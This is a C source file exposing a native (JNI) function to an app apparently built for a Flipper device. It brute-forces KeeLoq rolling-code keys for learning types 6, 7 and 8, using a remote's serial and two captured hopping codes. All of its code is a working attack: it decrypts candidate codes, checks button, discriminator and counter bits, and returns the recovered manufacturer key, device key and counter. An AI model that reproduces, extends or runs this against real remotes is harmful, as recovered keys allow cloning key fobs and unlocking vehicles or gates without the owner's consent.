#include <jni.h>
#include <stdint.h>
#include <stdbool.h>

#define KLQ_NLF 0x3A5C742EU
#define bit(x, n) (((x) >> (n)) & 1)
#define g5(x, a, b, c, d, e) \
    (bit(x,a) + bit(x,b)*2 + bit(x,c)*4 + bit(x,d)*8 + bit(x,e)*16)

static uint32_t keeloq_decrypt(uint32_t data, uint64_t key) {
    uint32_t x = data;
    for (int r = 0; r < 528; r++) {
        x = (x << 1) ^ bit(x, 31) ^ bit(x, 15)
            ^ (uint32_t)bit(key, (15 - r) & 63)
            ^ bit(KLQ_NLF, g5(x, 0, 8, 19, 25, 30));
    }
    return x;
}

static inline bool validate_hop(uint32_t dec, uint8_t expected_btn, uint16_t expected_disc) {
    if ((dec >> 28) != expected_btn) return false;
    uint16_t disc = (dec >> 16) & 0x3FF;
    if (disc == expected_disc) return true;
    if ((disc & 0xFF) == (expected_disc & 0xFF)) return true;
    return false;
}

static bool brute_type6(
    uint32_t serial, uint32_t hop1, uint32_t hop2,
    uint8_t btn, uint16_t disc,
    uint32_t range_start, uint32_t range_end,
    volatile int* cancel, int* keys_tested,
    uint64_t* out_man, uint64_t* out_devkey, uint32_t* out_cnt)
{
    uint64_t upper = ((uint64_t)(serial & 0x00FFFFFF) << 40)
        | ((uint64_t)(((serial & 0xFF) + ((serial >> 8) & 0xFF)) & 0xFF) << 32);

    for (uint64_t man_lo = (uint64_t)(range_start & 0xFFFFFFFFULL);
         man_lo < (uint64_t)(range_end & 0xFFFFFFFFULL); man_lo++) {
        if (*cancel) return false;

        uint64_t devkey = upper | (uint32_t)man_lo;
        uint32_t dec1 = keeloq_decrypt(hop1, devkey);

        if (!validate_hop(dec1, btn, disc)) {
            if ((man_lo & 0xFFFF) == 0) *keys_tested = (int)(man_lo - (range_start & 0xFFFFFFFFULL));
            continue;
        }

        uint32_t dec2 = keeloq_decrypt(hop2, devkey);
        if (validate_hop(dec2, btn, disc)) {
            uint16_t cnt1 = dec1 & 0xFFFF;
            uint16_t cnt2 = dec2 & 0xFFFF;
            int diff = (int)cnt2 - (int)cnt1;
            if (diff >= 1 && diff <= 256) {
                *out_man = upper | (uint32_t)man_lo;
                *out_devkey = devkey;
                *out_cnt = cnt1;
                return true;
            }
        }
        if ((man_lo & 0xFFFF) == 0) *keys_tested = (int)(man_lo - (range_start & 0xFFFFFFFFULL));
    }
    *keys_tested = (int)((range_end & 0xFFFFFFFFULL) - (range_start & 0xFFFFFFFFULL));
    return false;
}

static bool brute_type7(
    uint32_t serial, uint32_t fix, uint32_t hop1, uint32_t hop2,
    uint8_t btn, uint16_t disc,
    uint32_t range_start, uint32_t range_end,
    volatile int* cancel, int* keys_tested,
    uint64_t* out_man, uint64_t* out_devkey, uint32_t* out_cnt)
{
    uint8_t s0 = fix & 0xFF;
    uint8_t s1 = (fix >> 8) & 0xFF;
    uint8_t s2 = (fix >> 16) & 0xFF;
    uint8_t s3 = (fix >> 24) & 0xFF;

    for (uint64_t man_lo = (uint64_t)(range_start & 0xFFFFFFFFULL);
         man_lo < (uint64_t)(range_end & 0xFFFFFFFFULL); man_lo++) {
        if (*cancel) return false;

        uint64_t man = (uint32_t)man_lo;
        uint8_t* m = (uint8_t*)&man;
        m[4] = s3;
        m[5] = s2;
        m[6] = s1;
        m[7] = s0;

        uint64_t devkey = man;
        uint32_t dec1 = keeloq_decrypt(hop1, devkey);

        if (!validate_hop(dec1, btn, disc)) {
            if ((man_lo & 0xFFFF) == 0) *keys_tested = (int)(man_lo - (range_start & 0xFFFFFFFFULL));
            continue;
        }

        uint32_t dec2 = keeloq_decrypt(hop2, devkey);
        if (validate_hop(dec2, btn, disc)) {
            uint16_t cnt1 = dec1 & 0xFFFF;
            uint16_t cnt2 = dec2 & 0xFFFF;
            int diff = (int)cnt2 - (int)cnt1;
            if (diff >= 1 && diff <= 256) {
                *out_man = man;
                *out_devkey = devkey;
                *out_cnt = cnt1;
                return true;
            }
        }
        if ((man_lo & 0xFFFF) == 0) *keys_tested = (int)(man_lo - (range_start & 0xFFFFFFFFULL));
    }
    *keys_tested = (int)((range_end & 0xFFFFFFFFULL) - (range_start & 0xFFFFFFFFULL));
    return false;
}

static bool brute_type8(
    uint32_t serial, uint32_t hop1, uint32_t hop2,
    uint8_t btn, uint16_t disc,
    uint32_t range_start, uint32_t range_end,
    volatile int* cancel, int* keys_tested,
    uint64_t* out_man, uint64_t* out_devkey, uint32_t* out_cnt)
{
    uint32_t serial_lo24 = serial & 0xFFFFFF;

    for (uint64_t upper = (uint64_t)(range_start & 0xFFFFFFFFULL);
         upper < (uint64_t)(range_end & 0xFFFFFFFFULL); upper++) {
        if (*cancel) return false;

        uint64_t man = (upper << 24) | serial_lo24;
        uint64_t devkey = man;
        uint32_t dec1 = keeloq_decrypt(hop1, devkey);

        if (!validate_hop(dec1, btn, disc)) {
            if ((upper & 0xFFFF) == 0) *keys_tested = (int)(upper - (range_start & 0xFFFFFFFFULL));
            continue;
        }

        uint32_t dec2 = keeloq_decrypt(hop2, devkey);
        if (validate_hop(dec2, btn, disc)) {
            uint16_t cnt1 = dec1 & 0xFFFF;
            uint16_t cnt2 = dec2 & 0xFFFF;
            int diff = (int)cnt2 - (int)cnt1;
            if (diff >= 1 && diff <= 256) {
                *out_man = man;
                *out_devkey = devkey;
                *out_cnt = cnt1;
                return true;
            }
        }
        if ((upper & 0xFFFF) == 0) *keys_tested = (int)(upper - (range_start & 0xFFFFFFFFULL));
    }
    *keys_tested = (int)((range_end & 0xFFFFFFFFULL) - (range_start & 0xFFFFFFFFULL));
    return false;
}

JNIEXPORT jboolean JNICALL
Java_com_flipper_psadecrypt_KeeloqBruteForce_nativeBruteForce(
    JNIEnv* env, jobject thiz,
    jint learning_type,
    jint serial, jint fix,
    jint hop1, jint hop2,
    jint range_start, jint range_end,
    jintArray cancel_flag_arr,
    jintArray keys_tested_arr,
    jlongArray result_out)
{
    jint* cancel_ptr = (*env)->GetIntArrayElements(env, cancel_flag_arr, NULL);
    jint* tested_ptr = (*env)->GetIntArrayElements(env, keys_tested_arr, NULL);

    uint8_t btn = ((uint32_t)fix) >> 28;
    uint16_t disc = ((uint32_t)serial) & 0x3FF;

    uint64_t out_man = 0, out_devkey = 0;
    uint32_t out_cnt = 0;
    bool found = false;

    switch (learning_type) {
    case 6:
        found = brute_type6(
            (uint32_t)serial, (uint32_t)hop1, (uint32_t)hop2,
            btn, disc,
            (uint32_t)range_start, (uint32_t)range_end,
            (volatile int*)cancel_ptr, (int*)tested_ptr,
            &out_man, &out_devkey, &out_cnt);
        break;
    case 7:
        found = brute_type7(
            (uint32_t)serial, (uint32_t)fix, (uint32_t)hop1, (uint32_t)hop2,
            btn, disc,
            (uint32_t)range_start, (uint32_t)range_end,
            (volatile int*)cancel_ptr, (int*)tested_ptr,
            &out_man, &out_devkey, &out_cnt);
        break;
    case 8:
        found = brute_type8(
            (uint32_t)serial, (uint32_t)hop1, (uint32_t)hop2,
            btn, disc,
            (uint32_t)range_start, (uint32_t)range_end,
            (volatile int*)cancel_ptr, (int*)tested_ptr,
            &out_man, &out_devkey, &out_cnt);
        break;
    }

    (*env)->ReleaseIntArrayElements(env, cancel_flag_arr, cancel_ptr, 0);
    (*env)->ReleaseIntArrayElements(env, keys_tested_arr, tested_ptr, 0);

    if (found) {
        jlong result[3];
        result[0] = (jlong)out_man;
        result[1] = (jlong)out_devkey;
        result[2] = (jlong)out_cnt;
        (*env)->SetLongArrayRegion(env, result_out, 0, 3, result);
    }

    return (jboolean)found;
}
